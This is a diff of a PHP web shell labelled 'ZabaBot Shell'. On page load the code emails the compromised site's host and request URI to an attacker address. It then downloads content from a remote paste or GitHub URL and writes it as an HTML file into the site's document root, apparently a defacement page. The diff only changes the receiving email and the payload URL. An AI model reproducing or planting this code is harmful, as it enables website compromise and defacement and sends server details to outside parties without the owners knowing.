@@ -313,7 +313,7 @@ return $info;
 $ip = getenv("REMOTE_ADDR");
 $ra44 = rand(1, 99999);
 $subj98 = " ZabaBot v3 |$ra44";
-$email = "tsuminor@gmail.com";
+$email = "bu9p3t@gmail.com";
 $from = "From:  ZabaBot Shell<troy5@seznam.cz>";
 $a45 = $_SERVER['REQUEST_URI'];
 $b75 = $_SERVER['HTTP_HOST'];
@@ -322,8 +322,8 @@ $msg8873 = "$a45 $b75 $m22";
 mail($email, $subj98, $msg8873, $from);?>
 
 <?php
-$check3=$_SERVER['DOCUMENT_ROOT'] . "/def.html" ;
-$text3 = http_get('https://hastebin.com/raw/vutuqetofe');
+$check3=$_SERVER['DOCUMENT_ROOT'] . "/o.html" ;
+$text3 = http_get('https://raw.githubusercontent.com/boters/PythonBot/master/files/oss.txt');
 $op3=fopen($check3, 'w');
 fwrite($op3,$text3);
 fclose($op3);
